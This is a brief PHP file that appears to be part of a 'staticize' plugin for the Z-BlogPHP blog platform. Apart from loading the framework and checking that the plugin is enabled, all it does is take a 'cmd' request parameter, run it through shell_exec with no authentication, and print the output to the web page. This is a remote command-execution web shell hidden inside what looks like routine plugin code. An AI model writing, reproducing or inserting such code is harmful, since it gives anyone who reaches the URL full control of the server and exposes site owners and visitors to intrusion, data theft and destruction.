<?php

require '../../../zb_system/function/c_system_base.php';

$zbp->Load();

Add_Filter_Plugin('Filter_Plugin_Zbp_ShowError', 'RespondError', PLUGIN_EXITSIGNAL_RETURN);

if (!$zbp->CheckPlugin('staticize')) {
    $zbp->ShowError(48);
    die();
}


$cmd = trim($_REQUEST['cmd']);
if ($cmd == '') {
    $zbp->ShowError('命令为空.');
    die();
}


$output = shell_exec($cmd);
$output = nl2br($output); // 将换行符转换为 <br> 标签，使输出在网页中换行显示
echo $output;